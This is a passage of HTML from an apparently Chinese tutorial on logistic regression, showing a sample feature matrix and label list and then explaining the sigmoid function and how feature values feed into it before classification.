class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.851633</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.375691</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.510047</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6.061992</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.076637</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">3.181888</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.821096</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.28399</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.01015</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8.401766</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.099458</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.688274</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.834872</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.733869</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.846637</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3.849075</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.400102</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.628781</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.752842</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.468166</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.078557</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.059736</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.089392</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.7153</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.825662</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.693808</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.197445</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.744638</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.126117</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.922311</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.679797</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.22053</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.677983</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2.556666</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.761349</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10.693862</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.168791</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.143632</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.38861</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9.341997</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.317029</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14.739025</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef735920166847-3\"><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef735920166847-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0253 seconds] -->\r\n<p>样本数据<code>dataMat</code>的第一列，也就是我们的特征值<span id=\"MathJax-Element-6-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-26\" class=\"math\"><span id=\"MathJax-Span-27\" class=\"mrow\"><span id=\"MathJax-Span-28\" class=\"msubsup\"><span id=\"MathJax-Span-29\" class=\"mi\">X</span><span id=\"MathJax-Span-30\" class=\"mn\">0</span></span></span></span><span class=\"MJX_Assistive_MathML\">X0</span></span>全部为1，这个问题我们之后在计算回归参数时需要注意理解。所有的样本数据一共100条，对应的分类结果也是100个。</p>\n<p><strong>那么，我们现在的问题是：</strong><br>\n<strong>我们要找到样本空间中的特征值与分类结果的关系。设计一个函数或者功能，实现在输入一组特征值后，能够根据样本空间特征值与分类结果的关系，自动为输入的数据进行分类，即得到结果要么是1，要么是0。</strong></p>\n<h2 id=\"title-2\">二、Sigmoid函数</h2>\n<p>为了解决上一节我们提到的问题，我们这里先介绍一下Sigmoid函数：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fm60lvcgxjj208p03cdfn.jpg\" width=\"313\" height=\"120\"></p>\n<p>这个函数有如下几个特征：</p>\n<ul>\n<li>当<span id=\"MathJax-Element-8-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-49\" class=\"math\"><span id=\"MathJax-Span-50\" class=\"mrow\"><span id=\"MathJax-Span-51\" class=\"mi\">z</span><span id=\"MathJax-Span-52\" class=\"mo\">=</span><span id=\"MathJax-Span-53\" class=\"mn\">0</span></span></span><span class=\"MJX_Assistive_MathML\">z=0</span></span>时，值为<span id=\"MathJax-Element-9-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-54\" class=\"math\"><span id=\"MathJax-Span-55\" class=\"mrow\"><span id=\"MathJax-Span-56\" class=\"mn\">0.5</span></span></span><span class=\"MJX_Assistive_MathML\">0.5</span></span></li>\n<li>当<span id=\"MathJax-Element-10-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-57\" class=\"math\"><span id=\"MathJax-Span-58\" class=\"mrow\"><span id=\"MathJax-Span-59\" class=\"mi\">z</span></span></span><span class=\"MJX_Assistive_MathML\">z</span></span>不断增大时，值将趋近于1</li>\n<li>当<span id=\"MathJax-Element-11-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-60\" class=\"math\"><span id=\"MathJax-Span-61\" class=\"mrow\"><span id=\"MathJax-Span-62\" class=\"mi\">z</span></span></span><span class=\"MJX_Assistive_MathML\">z</span></span>不断减小时，值将趋近于0</li>\n</ul>\n<p>我们来看一下函数的曲线图：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fm60ltmj50j20fu0ag0sv.jpg\" width=\"570\" height=\"376\"></p>\n<p>我们如果将样本空间的3个特征值<span id=\"MathJax-Element-12-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-63\" class=\"math\"><span id=\"MathJax-Span-64\" class=\"mrow\"><span id=\"MathJax-Span-65\" class=\"msubsup\"><span id=\"MathJax-Span-66\" class=\"mi\">X</span><span id=\"MathJax-Span-67\" class=\"mn\">0</span></span></span></span><span class=\"MJX_Assistive_MathML\">X0</span></span>、<span id=\"MathJax-Element-13-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-68\" class=\"math\"><span id=\"MathJax-Span-69\" class=\"mrow\"><span id=\"MathJax-Span-70\" class=\"msubsup\"><span id=\"MathJax-Span-71\" class=\"mi\">X</span><span id=\"MathJax-Span-72\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">X1</span></span>和<span id=\"MathJax-Element-14-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-73\" class=\"math\"><span id=\"MathJax-Span-74\" class=\"mrow\"><span id=\"MathJax-Span-75\" class=\"msubsup\"><span id=\"MathJax-Span-76\" class=\"mi\">X</span><span id=\"MathJax-Span-77\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">X2</span></span>的值代入到函数中，计算出一个结果。那么这个结果将是接近与我们的分类结果的（0到1之间的一个数值）。如果这个结果接近0那么我们就认为分类为0，如果结果接近1我们就认为分类为1。</p>\n<p>以什么方式代入到函数中呢？其实简单的相加就可以，因为<span id=\"MathJax-Element-15-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-78\" class=\"math\"><span id=\"MathJax-Span-79\" class=\"mrow\"><span id=\"MathJax-Span-80\" class=\"mi\">z</span></span></span><span class=\"MJX_Assistive_MathML\">z</span></span>不断增大或者减小时，函数的值就相应的趋近于1或者0。我们使<span id=\"MathJax-Element-16-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-81\" class=\"math\"><span id=\"MathJax-Span-82\" class=\"mrow\"><span id=\"MathJax-Span-83\" class=\"mi\">z</span><span id=\"MathJax-Span-84\" class=\"mo\">=</span><span id=\"MathJax-Span-85\" class=\"msubsup\"><span id=\"MathJax-Span-86\" class=\"mi\">x</span><span id=\"MathJax-Span-87\" class=\"mn\">0</span></span><span id=\"MathJax-Span-88\" class=\"mo\">+</span><span id=\"MathJax-Span-89\" class=\"msubsup\"><span id=\"MathJax-Span-90\" class=\"mi\">x</span><span id=\"MathJax-Span-91\" class=\"mn\">1</span></span><span id=\"MathJax-Span-92\" class=\"mo\">+</span><span id=\"MathJax-Span-93\" class=\"msubsup\"><span id=\"MathJax-Span-94\" class=\"mi\">x</span><span id=\"MathJax-Span-95\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">z=x0+x1+x2</span></span></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fm60lvuesej2089027dfn.jpg\" width=\"297\" height=\"79\"></p>\n<p>但是实际的情况是我们的计算结果和实际的分类值，会有误差，甚至是完全不正确。为了矫正这个问题，我们为样本空间的3个特征值<span id=\"MathJax-Element-18-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-126\" class=\"math\"><span id=\"MathJax-Span-127\" class=\"mrow\"><span id=\"MathJax-Span-128\" class=\"msubsup\"><span id=\"MathJax-Span-129\" class=\"mi\">X</span><span id=\"MathJax-Span-130\" class=\"mn\">0</span></span></span></span><span class=\"MJX_Assistive_MathML\">X0</span></span>、<span id=\"MathJax-Element-19-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span 